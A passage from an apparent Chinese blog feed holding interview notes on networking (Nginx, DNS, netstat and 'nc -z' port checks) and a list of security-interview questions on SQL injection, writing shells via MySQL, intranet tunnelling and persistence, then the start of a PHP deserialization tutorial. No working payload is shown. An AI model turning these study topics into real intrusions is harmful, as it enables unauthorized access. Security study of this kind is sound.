对返回结果进行错误页跳转，异常判断等。如果被分发的服务器存在异常，他可以将请求重新转发给另外一台服务器，然后自动去除异常服务器。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101094821621.png\" alt=\"image-20221101094821621\" style=\"zoom:67%;\" />\n<p>2. 负载均衡</p>\n<p>单个服务器解决不了的问题，可以使用多个服务器，然后将请求分发到各个服务器上，将负载分发到不同的服务器，这就是负载均衡，核心是「分摊压力」。Nginx 实现负载均衡，一般来说指的是将请求转发给服务器集群。</p>\n<p>Nginx 提供的负载均衡策略有 2 种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的啦，你可以参照所有的负载均衡算法，给他一一找出来做下实现。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101095012272.png\" alt=\"image-20221101095012272\" style=\"zoom:67%;\" />\n<p>3. 动静分离</p>\n<p>为了加快网站的解析速度，可以把动态页面和静态页面由不同的服务器来解析，加快解析速度，降低原来单个服务器的压力。</p>\n<p>由于 Nginx 的高并发和静态资源缓存等特性，经常将静态资源部署在 Nginx 上。如果请求的是静态资源，直接到静态资源目录获取资源，如果是动态资源的请求，则利用反向代理的原理，把请求转发给对应后台应用去处理，从而实现动静分离。</p>\n<p>使用前后端分离后，可以很大程度提升静态资源的访问速度，即使动态服务不可用，静态资源的访问也不会受到影响。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101095048519.png\" alt=\"image-20221101095048519\" style=\"zoom:67%;\" />\n<p>4.web 缓存</p>\n<p>Nginx 可以对不同的文件做不同的缓存处理，配置灵活，并且支持 FastCGI_Cache，主要用于对 FastCGI 的动态程序进行缓存。配合着第三方的 ngx_cache_purge，对制定的 URL 缓存内容可以的进行增删管理。</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmdpbngub3JnLmNuL2FydGljbGUvZGV0YWlsLzU0NQ==\">Nginx 从入门到实践，万字详解！ - NGINX 开源社区</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS93M2Nub3RlL25naW54LXNldHVwLWludHJvLmh0bWw=\">Nginx 配置详解 | 菜鸟教程 (runoob.com)</span></p>\n<h3 id=\"14连通性toubleshooting问题\"><a class=\"markdownIt-Anchor\" href=\"#14连通性toubleshooting问题\">#</a> 14. 连通性 /toubleshooting 问题</h3>\n<h4 id=\"141判断和主机建立了连接的ip茄子\"><a class=\"markdownIt-Anchor\" href=\"#141判断和主机建立了连接的ip茄子\">#</a> 14.1 判断和主机建立了连接的 IP (茄子)</h4>\n<blockquote>\n<p>netstat -ano</p>\n<p>netstat -lntup</p>\n<p>nbtstat -A 10.129.52.207</p>\n<p>NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ]</p>\n<pre><code>        -a (适配器状态) 列出指定名称的远程机器的名称表\n    \n        -A (适配器状态) 列出指定 IP 地址的远程机器的名称表。\n    \n        -c (缓存) 列出远程[计算机]名称及其 IP 地址的 NBT 缓存\n    \n        -n (名称) 列出本地 NetBIOS 名称。\n    \n        -r (已解析) 列出通过广播和经由 WINS 解析的名称\n    \n        -R (重新加载) 清除和重新加载远程缓存名称表\n    \n        -S (会话) 列出具有目标 IP 地址的会话表\n    \n        -s (会话) 列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。\n    \n        -RR (释放刷新) 将名称释放包发送到 WINS，然后启动刷新\n</code></pre>\n</blockquote>\n<h4 id=\"142主机间是否连通端口是否开放茄子\"><a class=\"markdownIt-Anchor\" href=\"#142主机间是否连通端口是否开放茄子\">#</a> 14.2 主机间是否连通，端口是否开放 (茄子)</h4>\n<blockquote>\n<p>连通：</p>\n<p>ping</p>\n<p>traceroute</p>\n<p>端口：</p>\n<p>telnet 192.192.193.211 3389</p>\n<p>nc -z 192.192.193.211 22    //tcp</p>\n<p>nc –uz 192.192.193.211 22    //udp</p>\n<p>nmap   // 看我写的安全那块</p>\n<p>netstat -ano</p>\n<p>ssh 10.0.250.3 -p 80 -v</p>\n<p>wget …:</p>\n</blockquote>\n<h3 id=\"15怎么保证安全和可靠信锐\"><a class=\"markdownIt-Anchor\" href=\"#15怎么保证安全和可靠信锐\">#</a> 15. 怎么保证安全和可靠 (信锐)</h3>\n<blockquote>\n<p>可靠的接入层应提供以下主要特性：</p>\n<ul>\n<li>使用冗余引擎和冗余电源获得系统级冗余，为关键用户群提供高可靠性；</li>\n<li>与具备冗余系统的汇聚层进行双归属连接，获得缺省网关冗余，支持在汇聚层的主备交换机间快速实现故障切换；</li>\n<li>通过链路汇聚提高带宽利用率，同时降低复杂性；</li>\n<li>通过配置 802.1X，动态 ARP 检查及 IP 源地址保护等功能增加安全性，有效防止非法访问。</li>\n</ul>\n<p>接入层到汇聚层选择三角形组网，由于接入层三角形组网存在二层环路，所以需要在交换机上使能多生成树协议 MSTP。汇聚层交换机部署虚拟路由器冗余协议 VRRP，将 VRRP 组的虚拟 IP 地址作为服务器网关。</p>\n<p>汇聚层应使用与核心层相同结构的冗余节点备份连接，以实现最快速的路由收敛并避免黑洞产生。汇聚层做三层接入网关时，还需要通过 VRRP 等协议实现网关的冗余备份和流量的负载分担。汇聚层边界发生链路或节点故障时，收敛速度取决于缺省网关冗余与故障切换，通过合理地配置协议定时器，可达到秒级的收敛速度。</p>\n<p>汇聚层到核心层间采用 OSPF 等动态路由协议进行路由层面高可用保障。</p>\n<p>核心层设备作为网络的骨干，需要能提供快速的数据交换和极高的永续性。从备份和负载分担的角度可选用双核心或多核心；从单台设备考虑，选用交换性能和可靠性高的设备，支持双主控、电源冗余、风扇冗余、分布式转发等特性。并降低核心设备配置的复杂度，减少出现错误的几率。</p>\n<p>传统架构为保证网络高可靠性通常采用 MSTP+VRRP，这种组网需要在接入交换机与汇聚交换机间运行 MSTP 协议，管理和维护较复杂。但当接入交换机和汇聚交换机都采用 H3C IRF 智能弹性架构技术之后，可将每两台交换机（也可以是多台）配置成一个 IRF 堆叠组，两台汇聚交换机也配置成一个堆叠组，接入交换机与汇聚交换机之间通过捆绑链路连接，如图 3 所示。从逻辑上看，一个堆叠组就是一台设备，因此接入交换机和汇聚交换机间不存在二层环路，可以避免 MSTP 的配置管理，简化网络设计。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE0OTM1NDM3L2FydGljbGUvZGV0YWlscy83NjYxMTM3Mw==\">(67 条消息) 网络的可靠性是设计出来的_半遮雨的博客 - CSDN 博客_网络可靠性</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25mbGEuY29tL2RpYW5uYW8vNTI5Mzg5Lmh0bWw=\">如何保证网络安全 (cnfla.com)</span></p>\n</blockquote>\n<h3 id=\"16dns\"><a class=\"markdownIt-Anchor\" href=\"#16dns\">#</a> 16.DNS</h3>\n<h4 id=\"dns原理端口特斯拉长亭\"><a class=\"markdownIt-Anchor\" href=\"#dns原理端口特斯拉长亭\">#</a> DNS 原理，端口 (特斯拉，长亭)</h4>\n<blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20161222114949313\" alt=\"img\" style=\"zoom:80%;\" />\n<p>1、在浏览器中输入 www . qq .com 域名，操作系统会先检查自己本地的 hosts 文件是否有这个网址映射关系，如果有，就先调用这个 IP 地址映射，完成域名解析。<br>\n2、如果 hosts 里没有这个域名的映射，则查找本地 DNS 解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。<br>\n3、如果 hosts 与本地 DNS 解析器缓存都没有相应的网址映射关系，首先会找 TCP/ip 参数中设置的首选 DNS 服务器，在此我们叫它本地 DNS 服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。<br>\n4、如果要查询的域名，不由本地 DNS 服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个 IP 地址映射，完成域名解析，此解析不具有权威性。<br>\n5、如果本地 DNS 服务器本地区域文件与缓存解析都失效，则根据本地 DNS 服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地 DNS 就把请求发至 13 台根 DNS，根 DNS 服务器收到请求后会判断这个域名 (.com) 是谁来授权管理，并会返回一个负责该顶级域名服务器的一个 IP。本地 DNS 服务器收到 IP 信息后，将会联系负责.com 域的这台服务器。这台负责.com 域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com 域的下一级 DNS 服务器地址 (<span class=\"exturl\" data-url=\"aHR0cDovL3FxLmNvbQ==\">http://qq.com</span>) 给本地 DNS 服务器。当本地 DNS 服务器收到这个地址后，就会找 http://qq.com 域服务器，重复上面的动作，进行查询，直至找到 www . qq .com 主机。<br>\n6、如果用的是转发模式，此 DNS 服务器就会把请求转发至上一级 DNS 服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根 DNS 或把转请求转至上上级，以此循环。不管是本地 DNS 服务器用是是转发，还是根提示，最后都是把结果返回给本地 DNS 服务器，由此 DNS 服务器再返回给客户机。<br>\n从客户端到本地 DNS 服务器是属于递归查询，而 DNS 服务器之间就是的交互查询就是迭代查询。</p>\n<p>下面我们列出几条常用的资源记录类型：</p>\n<p>SOA: Start Of Authority, 起始授权记录，一个区域解析库仅能有一个 SOA 记录，而且必须为解析库的第一条</p>\n<p>NS：Name Server，域名服务器，专用于标明当前区域的 DNS 服务器</p>\n<p>MX: Mail eXchange, 邮件交换器，MX 记录有优先级属性（0-99）</p>\n<p>A：internet Address,FQDN --&gt; IP，专用于正向解析，用于实现将 FQDN 解析为 IP 地址</p>\n<p>PTR: PoinTeR,IP --&gt; FQDN，专用于反向解析，将 IP 地址解析为 FQDN</p>\n<p>AAAA：FQDN --&gt; IPv6，专用于正向解析，将 FQDN 解析为 IPv6 地址</p>\n<p>CNAME: Canonical Name，别名记录</p>\n<p>TXT：Text</p>\n<p>SRV：Service</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poZW5ncWlqdW5fL2FydGljbGUvZGV0YWlscy81MzgxMTIyOQ==\">DNS 的工作原理及解析_zhengqijun_的博客 - CSDN 博客_dns 的工作原理</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83OTM1MDM5NQ==\">面试官：讲讲 DNS 的原理？ - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjE4Nzgx\">https://cloud.tencent.com/developer/article/1618781</span></p>\n<p>DNS 中也有一个地方用到了 TCP 协议。那就是区域传送！</p>\n<p>DNS 的规范规定了 2 种类型的 DNS 服务器，一个叫主 DNS 服务器，一个叫辅助 DNS 服务器。在一个区中主 DNS 服务器从自己本机的数据文件中读取该区的 DNS 数据信息，而辅助 DNS 服务器则从区的主 DNS 服务器中读取该区的 DNS 数据信息。当一个辅助 DNS 服务器启动时，它需要与主 DNS 服务器通信，并加载数据信息，这就叫做区传送（zone transfer）。 这种情况下，使用 TCP 协议。</p>\n<p>UDP 的 DNS 协议只要一个请求、一个应答就好了。而使用基于 TCP 的 DNS 协议要三次握手、发送数据以及应答、四次挥手。但是 UDP 协议传输内容不能超过 512 字节。不过客户端向 DNS 服务器查询域名，一般返回的内容都不超过 512 字节，用 UDP 传输即可。</p>\n</blockquote>\n<h4 id=\"递归和迭代区别这个目前还没人问我闲着蛋疼自己问自己\"><a class=\"markdownIt-Anchor\" href=\"#递归和迭代区别这个目前还没人问我闲着蛋疼自己问自己\">#</a> 递归和迭代区别 (这个目前还没人问，我闲着蛋疼自己问自己)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）递归查询</span><br><span class=\"line\">递归查询是一种DNS 服务器的查询模式，在该模式下DNS 服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS 服务器本地没有存储查询DNS 信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。</span><br><span class=\"line\"></span><br><span class=\"line\">（2）迭代查询</span><br><span class=\"line\">DNS 服务器另外一种查询方式为迭代查询，DNS 服务器会向客户机提供其他能够解析查询请求的DNS 服务器地址，当客户机发送查询请求时，DNS 服务器并不直接回复查询结果，而是告诉客户机另一台DNS 服务器地址，客户机再向这台DNS 服务器提交请求，依次循环直到返回查询的结果为止。</span><br></pre></td></tr></table></figure>\n<p>17. 二层相关</p>\n<p>stp 作用 (宏杉)</p>\n<p>super vlan (宏杉)</p>\n<p>stp 选举 (中科闻歌)</p>\n<p>18 链路聚合 (宏杉，中科曙光)</p>\n<p>19. 防火墙硬件实现，IPSEC 了解过吗 (中科曙光)</p>\n<p>防火墙用过吗，啥型号的，A 访问 B 时在防火墙配置单向还是双向，如果是交换机，需要配置单向还是双向 (中科闻歌)</p>\n<p>20. 项目题</p>\n<p>小型星星网络</p>\n<p>1. 确定网络设备</p>\n<p>2. 交换机设备和接口数量，交换机选型 (吞吐量)</p>\n<h3 id=\"21dockerk8s\"><a class=\"markdownIt-Anchor\" href=\"#21dockerk8s\">#</a> 21.docker/k8s</h3>\n<h4 id=\"k8s四层网络架构\"><a class=\"markdownIt-Anchor\" href=\"#k8s四层网络架构\">#</a> k8s 四层网络架构</h4>\n<blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2423834-20210810140224965-314287464.png\" alt=\"img\"></p>\n<p><strong>Node 节点网络</strong></p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">底层基础设施支持节点主机之间网络的互通</span><br></pre></td></tr></table></figure>\n<p><strong>Pod 网络</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">能够相互做IP寻址、相互通讯</span><br></pre></td></tr></table></figure>\n<p><strong>Service</strong></p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个service背后往往是由多个pod组成的集群</span><br><span class=\"line\">由此引入了服务发现以及负载均衡等问题</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MjAzODU2OTg=\">深入理解 K8S 网络原理上 - 知乎 (zhihu.com)</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2423834-20210811115056926-1067408095.png\" alt=\"img\"></p>\n</blockquote>\n<p>中型</p>\n<p>大型</p>\n<p>ping 丢包</p>\n<h2 id=\"0x02-安全岗总结\"><a class=\"markdownIt-Anchor\" href=\"#0x02-安全岗总结\">#</a> 0x02 安全岗总结</h2>\n<p>1. 反序列化相关</p>\n<p>PHP 反序列化的魔法方法，wakeup 绕过 (理想)</p>\n<p>shrio 反序列化，fastjson 反序列化，struct S062 (深信服)</p>\n<p>java 反序列化 (深信服)</p>\n<p>2. 逻辑漏洞类</p>\n<p>逻辑漏洞任意邮箱注册怎么修复 (理想)</p>\n<p>登录框有啥漏洞 (安天)</p>\n<p>3.XSS 类</p>\n<p>富文本编辑器 XSS 怎么解决 (理想)</p>\n<p>说说看 xss (长亭)</p>\n<p>4.SQL 注入类</p>\n<p>SQL 注入怎么防，PDO 在 order by 场景怎么防 (理想)</p>\n<p>sql 注入有几种 (深信服)</p>\n<p>union select 后面可以加 insert 吗，union select 叫啥名字 (深信服)</p>\n<p>怎么通过数据库获取系统权限，mysql，sqlserver (深信服)</p>\n<p>mysql 写 shell 命令 (深信服)</p>\n<p>堆叠注入原理，和 union select 有啥区别 (深信服)</p>\n<p>报错注入语句 (深信服)</p>\n<p>时间盲注原理，语句 (深信服)</p>\n<p>5. 入侵排查怎么查，netstat 怎么看，怎么找进程 (理想，安天)</p>\n<p>6.discuz 漏洞复现 (可能因为我简历里写了)(理想)</p>\n<p>7.cookie 对单个参数长度限制 (理想)</p>\n<p>8. 出现 0day，资产排查 (理想)</p>\n<p>10. 文件上传 shell 成功但不能连接，怎么办 (深信服)</p>\n<p>11. 内网渗透相关</p>\n<p>内网隧道怎么搭，earthworm 三种模式 (深信服)</p>\n<p>内网横向 (深信服)</p>\n<p>wmin 端口，横向之后啥权限 (深信服)</p>\n<p>12. 权限维持 (深信服)</p>\n<p>13.waf 是干啥的，哪一层的 (长亭)</p>\n<p>14. 工具使用类</p>\n<p>nmap 参数，操作系统 (理想)</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/08/16/Unserialize/",
            "url": "http://example.com/2022/08/16/Unserialize/",
            "title": "unserialize",
            "date_published": "2022-08-16T05:38:45.000Z",
            "content_html": "<h1 id=\"unserialize\"><a class=\"markdownIt-Anchor\" href=\"#unserialize\">#</a> Unserialize</h1>\n<h2 id=\"1php\"><a class=\"markdownIt-Anchor\" href=\"#1php\">#</a> 1.php</h2>\n<h3 id=\"类与对象\"><a class=\"markdownIt-Anchor\" href=\"#类与对象\">#</a> 类与对象</h3>\n<p>类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class people&#123;</span><br><span class=\"line\">   //定义类属性（类似变量）,public 代表可见性（公有）</span><br><span class=\"line\">    public $name = &#x27;joker&#x27;;</span><br><span class=\"line\">   //定义类方法（类似函数）</span><br><span class=\"line\">   public function smile()&#123;</span><br><span class=\"line\">        echo $this-&gt;name.&quot; is smile...\\n&quot;;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$psycho = new people(); //根据people类实例化对象</span><br><span class=\"line\">$psycho-&gt;smile();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"魔法方法\"><a class=\"markdownIt-Anchor\" href=\"#魔法方法\">#</a> 魔法方法</h3>\n<p>为什么被称为魔法方法呢？因为是在触发了某个事件之前或之后，魔法函数会自动调用执行，而其他的普通函数必须手动调用才可以执行。PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以双下划线为前缀。</p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>__construct</td>\n<td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>\n</tr>\n<tr>\n<td>__destruct</td>\n<td>析构函数，和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用</td>\n</tr>\n<tr>\n<td>__toString</td>\n<td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如 echo 打印出对象就会调用此方法</td>\n</tr>\n<tr>\n<td>__wakeup()</td>\n<td>使用 unserialize 时触发，反序列化恢复对象之前调用该方法</td>\n</tr>\n<tr>\n<td>__sleep()</td>\n<td>使用 serialize 时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td>\n</tr>\n<tr>\n<td>__destruct()</td>\n<td>对象被销毁时触发</td>\n</tr>\n<tr>\n<td>__call()</td>\n<td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td>\n</tr>\n<tr>\n<td>__callStatic()</td>\n<td>在静态上下文中调用不可访问的方法时触发</td>\n</tr>\n<tr>\n<td>__get()</td>\n<td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td>\n</tr>\n<tr>\n<td>__set()</td>\n<td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td>\n</tr>\n<tr>\n<td>__isset()</td>\n<td>当对不可访问属性调用 isset () 或 empty () 时触发</td>\n</tr>\n<tr>\n<td>__unset()</td>\n<td>当对不可访问属性调用 unset () 时触发</td>\n</tr>\n<tr>\n<td>__invoke()</td>\n<td>当脚本尝试将对象调用为函数时触发</td>\n</tr>\n</tbody>\n</table>\n<p>额外提一下__tostring 的具体触发场景：</p>\n<blockquote>\n<p>(1) echo(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>o</mi><mi>b</mi><mi>j</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">/</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">obj) / print(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">)</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span></span></span></span>obj) 打印时会触发</p>\n<p>(2) 反序列化对象与字符串连接时</p>\n<p>(3) 反序列化对象参与格式化字符串时</p>\n<p>(4) 反序列化对象与字符串进行<mark>比较时（PHP 进行</mark>比较的时候会转换参数类型）</p>\n<p>(5) 反序列化对象参与格式化 SQL 语句，绑定参数时</p>\n<p>(6) 反序列化对象在经过 php 字符串函数，如 strlen ()、addslashes () 时</p>\n<p>(7) 在 in_array () 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用</p>\n<p>(8) 反序列化的对象作为 class_exists () 的参数的时候</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class animal &#123;</span><br><span class=\"line\">        private $name = &#x27;caixukun&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function sleep()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo $this-&gt;name . &quot; is sleeping...\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __wakeup()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__wakeup()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__construct()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __destruct()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__destruct()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __toString()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__toString()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __set($key, $value)&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__set()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __get($key) &#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__get()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $ji = new animal();</span><br><span class=\"line\">    $ji-&gt;name = 1;</span><br><span class=\"line\">    echo $ji-&gt;name;</span><br><span class=\"line\">    $ji-&gt;sleep();</span><br><span class=\"line\">    $ser_ji = serialize($ji);</span><br><span class=\"line\">    //print_r($ser_ji);</span><br><span class=\"line\">    print_r(unserialize($ser_ji))</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//最后调用的结果是：</span><br><span class=\"line\">调用了__construct()方法</span><br><span class=\"line\">调用了__set()方法</span><br><span class=\"line\">调用了__get()方法</span><br><span class=\"line\">caixukun is sleeping...</span><br><span class=\"line\">调用了__wakeup()方法 animal Object ( [name:animal:private] =&gt; caixukun )</span><br><span class=\"line\">调用了__destruct()方法</span><br><span class=\"line\">调用了__destruct()方法</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化与反序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化与反序列化\">#</a> 序列化与反序列化</h3>\n<p>在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到 mysql 数据库中时，我们时常需要将数组进行序列号操作。</p>\n<p>php 序列化（serialize）：是将变量转换为可保存或传输的字符串的过程</p>\n<p>php 反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用</p>\n<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>\n<p>常见的 php 系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>\n<h4 id=\"序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化\">#</a> 序列化</h4>\n<p><strong>需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化</strong>。</p>\n<ul>\n<li>使用 public 修饰进行序列化后，变量 $team 的长度为 4，正常输出。</li>\n<li>使用 private 修饰进行序列化后，会在变量 $team_name 前面加上类的名称，在这里是 object，并且长度会比正常大小多 2 个字节，也就是 9+6+2=17。</li>\n<li>使用 protected 修饰进行序列化后，会在变量 $team_group 前面加上 *，并且长度会比正常大小多 3 个字节，也就是 10+3=13。</li>\n</ul>\n<p>通过对比发现，在受保护的成员前都多了两个字节，受保护的成员在序列化时规则：</p>\n<blockquote>\n<ol>\n<li>\n<p>受 Private 修饰的私有成员，序列化时: \\x00 + [私有成员所在类名] + \\x00 [变量名]</p>\n</li>\n<li>\n<p>受 Protected 修饰的成员，序列化时：\\x00 + * + \\x00 + [变量名]</p>\n</li>\n</ol>\n<p>其中，&quot;\\x00&quot; 代表 ASCII 为 0 的值，即空字节，&quot;*&quot; 必不可少。</p>\n</blockquote>\n<p>验证一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td 